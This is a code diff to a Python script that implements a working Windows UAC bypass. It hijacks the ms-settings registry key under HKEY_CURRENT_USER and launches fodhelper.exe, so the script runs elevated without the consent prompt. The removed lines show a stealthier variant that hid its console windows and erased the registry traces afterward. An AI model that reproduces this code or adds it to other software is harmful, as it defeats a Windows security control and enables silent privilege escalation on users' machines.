@@ -13,9 +13,10 @@
 import os
 import sys
 import ctypes
-import subprocess
 
-UAC_REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
+CMD = r"C:\Windows\System32\cmd.exe"
+FOD_HELPER = r"C:\Windows\System32\fodhelper.exe"
+REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
 UAC_BYPASS_FLAG_FILE = "__uac_bypass__"
 UAC_DIALOG_FLAG = "--uac-dialog"
 
@@ -28,66 +29,37 @@ def is_admin() -> bool:
         return False
 
 
+def _create_reg_key(key: str, value: str) -> None:
+    """创建/写入注册表键值"""
+    try:
+        import winreg
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+        registry_key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE
+        )
+        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
+        winreg.CloseKey(registry_key)
+    except Exception:
+        raise
+
+
 def _try_bypass_uac(entry_script: str) -> bool:
     """
     尝试通过 fodhelper.exe 注册表劫持绕过 UAC。
-    原理：fodhelper.exe 是系统信任程序，运行时自动提权且不弹 UAC。
-    修改注册表指向我们的脚本，触发它执行。
-
-    返回 True 表示成功触发，当前进程应立即退出。
+    完全按照知乎文章方案：cmd.exe /k python main.py
     """
     if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
-        return False  # 已经提过权，防止递归
-
-    try:
-        import winreg
-    except ImportError:
         return False
 
     try:
-        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, UAC_REG_PATH)
-
-        # 清空 DelegateExecute 让 fodhelper 走我们指定的命令
-        winreg.SetValueEx(reg_key, "DelegateExecute", 0, winreg.REG_SZ, "")
-
-        # 设置默认值为启动命令
-        # 优先用 pythonw.exe（无控制台窗口），避免 fodhelper 提权时闪黑框
-        python_exe = sys.executable
-        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
-        if os.path.exists(pythonw_exe):
-            python_exe = pythonw_exe
-        cmd = f'"{python_exe}" "{os.path.abspath(entry_script)}" {UAC_BYPASS_FLAG_FILE}'
-        winreg.SetValueEx(reg_key, "", 0, winreg.REG_SZ, cmd)
-
-        winreg.CloseKey(reg_key)
-
-        # 静默启动 fodhelper（隐藏 cmd 窗口）
-        subprocess.Popen(
-            r"C:\Windows\System32\fodhelper.exe",
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-
-        # 尽快清理注册表
-        _cleanup_registry()
-
+        current_dir = os.path.abspath(entry_script)
+        cmd = '{} /k {} {}'.format(CMD, sys.executable, current_dir)
+        _create_reg_key("DelegateExecute", "")
+        _create_reg_key(None, cmd)
+        os.system(FOD_HELPER)
         return True
-    except Exception as e:
-        print(f"[UAC] fodhelper bypass 异常: {e}")
-        return False
-
-
-def _cleanup_registry() -> None:
-    """清理 fodhelper 注册表劫持痕迹"""
-    try:
-        import winreg
-        reg_key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER, UAC_REG_PATH, 0, winreg.KEY_SET_VALUE
-        )
-        winreg.DeleteValue(reg_key, "DelegateExecute")
-        winreg.DeleteValue(reg_key, "")
-        winreg.CloseKey(reg_key)
     except Exception:
-        pass
+        return False
 
 
 def _try_uac_dialog() -> None:
